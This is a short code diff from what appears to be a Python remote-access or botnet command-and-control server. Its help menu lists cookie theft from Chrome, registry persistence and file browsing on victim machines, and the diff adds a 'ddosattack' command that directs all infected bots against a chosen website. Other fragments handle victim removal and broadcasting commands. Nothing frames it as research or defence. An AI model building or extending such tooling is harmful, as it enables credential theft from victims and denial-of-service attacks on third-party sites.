@@ -434,6 +434,7 @@ def target_communication(target, ip):
                     Get-Cookies                        --> Grab Cookies From Chrome
                     Http-Server                        --> Start python Http Server for Browsing Files
                     Http-Sestop                        --> Stop the Http-server
+                    ddosattack      -->  make all bots attack website for you command syntax ex:ddosattack website,ip|port
                     persistence *RegName* *fileName*    --> Create Persistence In Registry'''))
             elif command[:11] == 'screenshare':
                 upload_file(target, 'scripts\\screenshare.ps1')
@@ -626,8 +627,6 @@ while True:
         targets.remove(targ)
         ips.remove(ip)
         users.remove(int(command[5:]))
-
-
     elif command[:7] == 'sendall':
         x = len(targets)
         i = 0
